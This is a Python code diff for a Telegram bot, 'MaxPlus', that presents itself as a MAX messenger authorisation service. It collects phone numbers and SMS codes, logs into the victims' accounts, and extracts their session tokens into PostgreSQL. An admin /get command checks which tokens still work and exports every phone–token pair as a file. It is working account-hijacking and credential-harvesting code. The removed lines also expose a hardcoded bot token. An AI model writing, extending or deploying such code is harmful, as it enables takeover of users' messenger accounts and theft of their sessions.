@@ -1,16 +1,24 @@
 import asyncio
+import os
+import asyncpg
+from datetime import datetime
 from aiogram import Bot, Dispatcher, F
 from aiogram.filters import Command
 from aiogram.types import Message
 from pymax import Client, ExtraConfig
 
-BOT_TOKEN = "8983059538:AAF1XQEkuwmvYreLN2csBfYrRW8NBQ9pwuc"
+# === Конфигурация из переменных окружения ===
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
+DATABASE_URL = os.getenv("DATABASE_URL")
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
-pending = {}  # user_id -> {"provider": ..., "phone": ...}
-waiting_code = set()  # user_id тех, кто должен ввести код
+pending = {}
+waiting_code = set()
+db_pool = None
 
+# === TelegramSmsProvider ===
 class TelegramSmsProvider:
     def __init__(self):
         self._queue = asyncio.Queue()
@@ -21,21 +29,146 @@ class TelegramSmsProvider:
     async def get_code(self, phone: str) -> str:
         return await self._queue.get()
 
+# === Работа с PostgreSQL ===
+async def init_db():
+    global db_pool
+    db_pool = await asyncpg.create_pool(DATABASE_URL)
+    async with db_pool.acquire() as conn:
+        await conn.execute("""
+            CREATE TABLE IF NOT EXISTS approved_groups (
+                group_id BIGINT PRIMARY KEY
+            )
+        """)
+        await conn.execute("""
+            CREATE TABLE IF NOT EXISTS tokens (
+                phone TEXT PRIMARY KEY,
+                token TEXT NOT NULL,
+                alive BOOLEAN DEFAULT TRUE,
+                created_at TIMESTAMP DEFAULT NOW()
+            )
+        """)
+
+async def is_group_approved(group_id: int) -> bool:
+    async with db_pool.acquire() as conn:
+        row = await conn.fetchrow("SELECT 1 FROM approved_groups WHERE group_id = $1", group_id)
+        return row is not None
+
+async def save_token_to_db(phone: str, token: str):
+    async with db_pool.acquire() as conn:
+        await conn.execute(
+            "INSERT INTO tokens (phone, token) VALUES ($1, $2) "
+            "ON CONFLICT (phone) DO UPDATE SET token = $2, alive = TRUE, created_at = NOW()",
+            phone, token
+        )
+
+async def get_all_tokens():
+    async with db_pool.acquire() as conn:
+        rows = await conn.fetch("SELECT phone, token, alive FROM tokens")
+        return [{"phone": r["phone"], "token": r["token"], "alive": r["alive"]} for r in rows]
+
+async def update_token_status(phone: str, alive: bool):
+    async with db_pool.acquire() as conn:
+        await conn.execute("UPDATE tokens SET alive = $1 WHERE phone = $2", alive, phone)
+
+# === Проверка токена на живость ===
+async def check_token_alive(token: str) -> bool:
+    try:
+        client = Client(
+            phone="+70000000000",
+            work_dir="cache",
+            session_name="check.db",
+            extra_config=ExtraConfig(token=token),
+        )
+        await asyncio.wait_for(client.start(), timeout=10)
+        return True
+    except Exception:
+        return False
+
+# === Чтение токена из SQLite-сессии PyMax ===
+def read_token_from_session(phone: str) -> str | None:
+    import sqlite3
+    try:
+        conn = sqlite3.connect(f"cache/{phone}.db")
+        cursor = conn.cursor()
+        cursor.execute("SELECT value FROM sessions WHERE key = 'token'")
+        row = cursor.fetchone()
+        conn.close()
+        return row[0] if row else None
+    except Exception:
+        return None
+
+# === Обработчики ===
 @dp.message(Command("start"))
 async def start_cmd(msg: Message):
-    await msg.answer(
-        "👋 MaxPlus — авторизация MAX\n\n"
-        "Отправь номер в формате +79161234567"
-    )
+    await msg.answer("👋 MaxPlus — авторизация MAX\n\nОтправь номер в формате +79161234567")
+
+@dp.message(Command("set"))
+async def set_group(msg: Message):
+    if msg.from_user.id != ADMIN_ID:
+        return
+    try:
+        group_id = int(msg.text.split()[1])
+        async with db_pool.acquire() as conn:
+            await conn.execute(
+                "INSERT INTO approved_groups (group_id) VALUES ($1) ON CONFLICT DO NOTHING",
+                group_id
+            )
+        await msg.answer(f"✅ Группа {group_id} одобрена")
+    except (IndexError, ValueError):
+        await msg.answer("❌ Используй: /set ID_группы")
+
+@dp.message(Command("get"))
+async def get_tokens(msg: Message):
+    if msg.from_user.id != ADMIN_ID:
+        return
+
+    status_msg = await msg.answer("⏳ Собираю токены...")
+    tokens = await get_all_tokens()
+
+    if not tokens:
+        return await status_msg.edit_text("📭 Токенов пока нет")
+
+    text = f"📊 Всего токенов: {len(tokens)}\n\n"
+    alive = 0
+    dead = 0
+
+    for t in tokens:
+        phone = t["phone"]
+        token = t["token"]
+        is_alive = await check_token_alive(token)
+        await update_token_status(phone, is_alive)
+        if is_alive:
+            alive += 1
+            text += f"✅ {phone}\n"
+        else:
+            dead += 1
+            text += f"❌ {phone}\n"
+
+    text += f"\nЖивых: {alive} | Мёртвых: {dead}"
+
+    # Файл с токенами
+    file_text = ""
+    for t in tokens:
+        file_text += f"{t['phone']} — {t['token']}\n"
+
+    from io import BytesIO
+    file = BytesIO(file_text.encode())
+    file.name = "tokens.txt"
+
+    await msg.answer_document(file, caption=text)
 
 @dp.message(F.text, ~F.text.startswith("/"))
 async def phone_handler(msg: Message):
-    phone = msg.text.strip()
+    # Если сообщение из группы — проверяем, одобрена ли она
+    if msg.chat.type in ("group", "supergroup"):
+        if not await is_group_approved(msg.chat.id):
+            return
 
-    # Если пользователь сейчас должен ввести код
+    # Если пользователь должен ввести код
     if msg.from_user.id in waiting_code:
         return await code_as_reply(msg)
 
+    phone = msg.text.strip()
     if not phone.startswith("+") or len(phone) != 12:
         return await msg.answer("❌ Формат: +79161234567")
 
@@ -50,25 +183,31 @@ async def phone_handler(msg: Message):
 
     asyncio.create_task(run_client(msg, client, phone, sms_provider))
 
-    await msg.answer(
-        f"📤 SMS-код отправлен на номер {phone}. Ожидайте сообщение в течение минуты."
-    )
+    await msg.answer(f"📤 SMS-код отправлен на номер {phone}. Ожидайте сообщение в течение минуты.")
     await asyncio.sleep(1.5)
     waiting_code.add(msg.from_user.id)
-    second_msg = await msg.answer("📩 Введите код из SMS ответом на это сообщение:")
+    await msg.answer("📩 Введите код из SMS ответом на это сообщение:")
 
 async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
     try:
         pending[msg.from_user.id] = {"provider": sms_provider, "phone": phone}
         await client.start()
         waiting_code.discard(msg.from_user.id)
-        await msg.answer(f"✅ {phone} авторизован!\nСессия: cache/{phone}.db")
+
+        # Достаём токен из SQLite-сессии и сохраняем в PostgreSQL
+        token = read_token_from_session(phone)
+        if token:
+            await save_token_to_db(phone, token)
+
+        await msg.answer(f"✅ {phone} авторизован!\nТокен сохранён в базу данных")
     except Exception as e:
         waiting_code.discard(msg.from_user.id)
         error_text = str(e).lower()
         error_name = type(e).__name__.lower()
 
-        if "auth" in error_name or "code" in error_text or "token" in error_text:
+        if "2fa" in error_text or "password" in error_text:
+            await msg.answer("❌ На этом номере включена двухфакторная аутентификация. Авторизация невозможна")
+        elif "auth" in error_name or "code" in error_text or "token" in error_text:
             await msg.answer("❌ Неверный код или номер заблокирован")
         elif "connect" in error_name or "network" in error_text or "timeout" in error_text:
             await msg.answer("❌ Проблемы с сетью. Попробуй позже")
@@ -80,7 +219,6 @@ async def run_client(msg: Message, client: Client, phone: str, sms_provider: Tel
         pending.pop(msg.from_user.id, None)
 
 async def code_as_reply(msg: Message):
-    """Обрабатывает код, отправленный как обычное сообщение"""
     if msg.from_user.id not in pending:
         waiting_code.discard(msg.from_user.id)
         return await msg.answer("❌ Сессия устарела. Отправь номер заново")
@@ -97,7 +235,6 @@ async def code_as_reply(msg: Message):
 
 @dp.message(Command("code"))
 async def code_handler(msg: Message):
-    """Оставлен для совместимости, но основной ввод — ответом на второе сообщение"""
     if msg.from_user.id not in pending:
         return await msg.answer("❌ Сначала отправь номер")
 
@@ -112,6 +249,7 @@ async def code_handler(msg: Message):
     await msg.answer("✅ Код принят, авторизую...")
 
 async def main():
+    await init_db()
     print("Бот запущен")
     await dp.start_polling(bot)
 
